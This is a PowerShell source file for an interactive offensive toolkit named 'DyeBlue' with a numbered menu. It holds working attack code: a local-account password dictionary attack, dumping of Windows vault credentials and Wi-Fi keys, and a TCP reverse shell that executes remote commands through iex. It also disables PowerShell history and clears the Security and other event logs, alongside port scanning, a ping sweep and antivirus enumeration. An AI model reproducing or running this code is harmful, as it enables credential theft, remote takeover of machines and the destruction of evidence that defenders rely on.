#Port Scanning
function port-scan{
  #
  "Port Scanning"
  ""
  "1. Scanning ports ranging from 1 to 1024"
  "2. Specify one port to scan"
  ""
  "Please enter 1 or 2"
  ""
  $option = Read-Host -Prompt "[DyeBlue]:"

  if ($option -eq "1"){

    $ip = Read-Host -Prompt "[IP Address]:"
    1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect($ip,$_)) "Port $_ is open."} 2>$null;

  }elseif($option -eq "2") {
  
  $ip = Read-Host -Prompt "[IP Address]:";
  $port = Read-Host -Prompt "[Port Number]:"
  
  try{
    echo ((new-object Net.Sockets.TcpClient).Connect($ip,$port)) "Port $port is open on $ip"; 2>$null; 
  }catch{
    "Error."
  }
  
  }else{
  
  "Please enter 1 or 2. Exiting."
  
  }
}

#Credential Dumping
function credential-dumping{

  ""
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 $vault = New-Object Windows.Security.Credentials.PasswordVault
 $vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
 ""
}

#Wi-Fi Password Dumping
function wifi-creddump{
  (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
}

#Show DNS Cache
function display-dns{
  ipconfig /displaydns | Select-String "Record Name";
}

# Delele Powershell Log file.

function disable-logging{

  Set-PSReadlineOption –HistorySaveStyle SaveNothing
  "Delete Powershell Logging data file successfully."
  ""
  "Logging File is located on "
  "    C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
  ""
}

#Ping Sweep
function ping-sweep{
  
  #Please edit Subnet mask by yourself.

  (1..254) | % {$ip="192.168.2.$_"; Write-output "$IP  $(test-connection -computername "$ip" -quiet -count 1)"}
  #(1..254) | % {$ip="192.168.2.$_"; Write-output "$IP  $(test-connection -computername "$ip" -quiet -count 1)"}
}


# Dictionary attack 
function local-da{
  ""
  "( Lockout Settings Confirmation )"
  net accounts | select-string Lockout
  ""
  $decision = Read-Host -Prompt "[Continue? (yes or no) ]:";
  if ( $decision -eq  "yes" -or $decision -eq "y" -or $decision -eq "Yes" ){
    local-da-2;    
  } elseif( $decision -eq "no" -or $decision -eq "n" -or $decision -eq "No" ){
    "Exiting."
  }else{
    "Please answer yes or no. Exiting."
  }
  

}

function local-da-2{
  ""
  "( Local Account Dictionary Attack )"  
  ""
  function Identify-password-001{

    $File = Read-Host -Prompt "[File Name]:";
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
    $t = [DirectoryServices.AccountManagement.ContextType]::Machine
    $a = [DirectoryServices.AccountManagement.PrincipalContext]::new($t)
    
    $u = Read-Host -Prompt "[Account Name]:";

    ForEach ( $p in ( gc $File )  ){

      Write-Host "Password : ", $p;
      Write-HOst "[DyeBLue] trying password : $p";
      if ( $a.ValidateCredentials($u,$p) -eq "yes" ) { Write-Host "Password Found : $p" -Fore Green; break; } else { echo " $p didn't match."; ""; }

    }
  }

  Identify-password-001;

}

#System information

function acquire-sysSetting{
  ""
  "(( OS Information ))"
  wmic os list brief
  ""
  "(( BIOS Information ))"
  wmic bios list brief
  ""
  "(( Printer Information ))"
  wmic printer list brief
  ""
  wmic printerconfig list brief
  ""
}

#User account information gathering

function user-account{
  ""
  "( Current User )"
  ""
  whoami
  ""
  "( Is this account Running with Admin Priviledge ? )"
  ""
  If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { echo "Yes"; } else { echo "No"; }
  ""
  "( SID of the Current User )"
  ""
  ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
  ""
  "( All User's Profiles )"
  ""
  wmic useraccount list brief
}

#Reverse Shell

function reverse-shell{

  $encoding = New-Object Text.ASCIIEncoding

  Write-Host
  "Requirements for Reverse Shell "
  Write-Host

  $ip = Read-Host -Prompt "[IP Address]:";
  $p = Read-Host -Prompt "[Port Number]:";
  $port=[int]$p; $ascii= "ASCII";
  $sock = (New-Object Net.Sockets.TCPClient($ip, $port)).GetStream();

  [byte[]]$range=0..65535|foreach{0};while(($x=$sock.Read($range,0,$range.Length)) -ne 0){;
  $string=$encoding.GetString($range,0,$x);

  $entext=([text.encoding]::$ascii).GetBytes((iex $string 2>&1));
  $sock.write($entext,0,$entext.Length)}

}

#Quoted from RedRabbit
#Base64 Encoding and Decoding

function base64-encoding {

$edo = @('
    
        Encoding Options:
       
         1. Encoding Text
         2. Decoding Text
    
')

$edo

$eop = Read-Host -Prompt "[Option]:"
Write-Output ""

if ($eop -eq "1"){
  
  Write-Host "[*] Encoding Option Selected ..."
  $et = Read-Host -Prompt " [Text To Encode]:"

  Write-Host "[*] Encoding Text ..."
  Start-Sleep -Seconds 2

  $Bytes = [System.Text.Encoding]::Unicode.GetBytes($et)
  $EncodedText = [Convert]::ToBase64String($Bytes)

  if ( $EncodedText -ne $null ){
    Write-Host "Successfully Encoded Text: " -ForegroundColor Green
    Write-Host ""

    $EncodedText

    Write-Host ""
    Set-Clipboard $EncodedText

    Write-Host "[*] Copied To Clipboard ..."
  } else {

    Write-Host "Failed to Encode ..." -ForegroundColor Red

  }

} else {
  Write-Host "[*] Decoding Option Selected ..."

  $dt = Read-Host -Prompt "[Text to Decode]:"
 
  Write-Host "[*] Decoding Text ..."
  Start-Sleep -Seconds 2

  $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($dt))

  if ($DecodedText -ne $null){
   
    Write-Host "Successfully Decoded Text: " -ForegroundColor Green
    Write-Output ""

    $DecodedText
    Write-Output ""

    Set-Clipboard $DecodedText
    Write-Host "[*] Copied to Clipboard ..."

  } else {

    Write-Host "Failed to Decode ..." -ForegroundColor Red

  }

}

}


#Search String in Registry
function reg-search{
  
  Write-Host
  Write-Host "Input String you want to search in registry";
  Write-Host
  $word = Read-Host -Prompt "[String]:";
  $hives = $hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG";

  try{
    foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | select-string "$word" };
  
  }catch{
    #Error handling
      
    Write-Host "Invalid Input. Exiting."

  }
}

# List AV Product

function list-av{
  wmic /namespace:\\root\securitycenter2 path antivirusproduct
}

#Delete Event Log(Application,System,Security,Setup)

function del-eventlog{

  $logs = "Application","System","Security","Setup";

  If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) 
  { 
    ""
    "You have administrative privileges.";
    ""
    sleep 1.5
    "Deleting Now..."
    sleep 1.5
    ""
      try {
    
        foreach ($l in $logs ){ wevtutil cl $l };
          echo "Event Logs are deleted Successfully.";
  
      }catch {
  
        write-host "Error."

      }

      
  } else { ""; echo "Before you continue, you must have administrative privileges. Exiting."; "";}

}

#Detect last attached USB
function attached-usb{

  Get-ItemProperty -Path HKLM:\SYStem\CurrentControlSet\Enum\USBSTOR\*\* | Select FriendlyName

}

#Display Name

$l1 = @('



   ████████                        █████████      ████                     
   █▓▒   ███▒                      ███▒  ████     ██▒      
   █▓▒      █▒                     ██▒    ███     ██▒
   █▓       █▒                     ██▒      ██    ██▒                     
   █        █▒                     ██   ▓████     ██▓▒   
   █       ██▒ ██    ██▒  ███████  ████████████   ██▒            █     █      ██████
   █▓▒   ███▒   ██  ██▒  ██▒  ▒██  ██▓▒   ████    ██▒            █     █     ██▒   ██
   █▓▒  ███▒      █ █▓▒ ██████████ ██▓▒    ████   ██▓▒    ████   █▓    █    ██▓▒    ██
   ███████▒       ██▓▒   ██        ███▓▒  ████    ███▓▒     ██   █▓▒   █▒   ██████████
                 ██▓▒    ██████   ██████████      ████████████   ███████▒   █     
                ██▒      ▓▒▓▒▓▒                   ▓▒     ▓▒▓▒▒   ▒  ▓▒▓▒█   █▓▒     █▓▒
             ████▒                                                     ▓▒█   ████████▒
                                                                              ▓▒▓▒▓▒▓▒


       Creator: Mi.Kasa.   test@protonmail.com


')


Write-Host $l1 -Fore gray
#Main

while($true)
{


#Read from keyboard
$option = Read-Host -Prompt "[DyeBlue]:";

if ($option -eq "exit"){ exit }

  if ($option -eq "help" -or $option -eq "h"){

  #Top Menu
  $help = ('

    Please enter the number below | Enter "exit" to end DyeBlue.

    Option 1: Local Account Dictionary Attack       Option 2: Port Scanner 
    Option 3: Credential Dumping (Web Browser)      Option 4: Wi-Fi Password Dumping 
    Option 5: Display DNS Cache                     Option 6: Ping Sweep
    Option 7: Delete Powershell Logging datafile
    Option 8: DIsplay Computer System(OS, BIOS, Printer)
    Option 9: Display User Account Information      Option 10: Detect last attached USB in PC  
    Option 11: Establish a Reverse Shell            Option 12: Base64 Text Encoding 
    Option 13: String Search in Registry          Option 14: List Installed AntiVirus Software
    Option 15: Delete Event Logs(Application, System, Security)

  ')

  $help
  
  }

  #Condition

  if ($option -eq "1"){
        local-da;
  }
  
  if ( $option -eq "2" ){
        port-scan;
  }

  if ( $option -eq "3" ){
        credential-dumping;
  }

  if ( $option -eq "4" ){
        wifi-creddump;
  }

  if ( $option -eq "5" ){
        display-dns;
  }

  if ( $option -eq "6" ){
        ping-sweep;
  }

  if ( $option -eq "7" ){
        disable-logging;
  }

  if ( $option -eq "8" ){
        acquire-sysSetting;
  }

  if ( $option -eq "9" ){
        user-account;     
  }

  if ( $option -eq "10" ){
        attached-usb;
  }

  if ( $option -eq "11" ){
        reverse-shell;
  }

  if ( $option -eq "12" ){
        base64-encoding;
  }

  if ( $option -eq "13" ){
        reg-search;
  }

  if ( $option -eq "14" ){
        list-av;
  }

  if ( $option -eq "15" ){
        del-eventlog;
  }

}






